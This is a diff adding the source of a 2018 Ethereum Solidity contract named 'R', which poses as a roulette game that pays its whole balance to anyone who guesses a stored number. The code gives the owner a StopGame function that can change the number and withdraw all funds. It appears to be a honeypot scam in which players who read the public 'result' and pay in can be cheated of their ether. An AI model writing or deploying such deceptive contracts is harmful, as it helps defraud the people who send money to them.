@@ -1,0 +1,63 @@
+
+//Address: 0x57684f9059afbf7bb11b07263500292ac9d78e7b
+//Contract name: R
+//Balance: 0.0021 Ether
+//Verification Date: 6/18/2018
+//Transacion Count: 3
+
+// CODE STARTS HERE
+
+pragma solidity ^0.4.20;
+
+contract R
+{
+
+    uint8 public result = 0;
+
+    bool public finished = false;
+
+    address public rouletteOwner;
+
+    function Play(uint8 _number)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        if(result == _number && msg.value>0.001 ether && !finished)
+        {
+            msg.sender.transfer(this.balance);
+            GiftHasBeenSent();
+        }
+    }
+
+    function StartRoulette(uint8 _number)
+    public
+    payable
+    {
+        if(result==0)
+        {
+            result = _number;
+            rouletteOwner = msg.sender;
+        }
+    }
+
+    function StopGame(uint8 _number)
+    public
+    payable
+    {
+        require(msg.sender == rouletteOwner);
+        GiftHasBeenSent();
+        result = _number;
+        if (msg.value>0.001 ether){
+            msg.sender.transfer(address(this).balance);
+        }
+    }
+
+    function GiftHasBeenSent()
+    private
+    {
+        finished = true;
+    }
+
+    function() public payable{}
+}
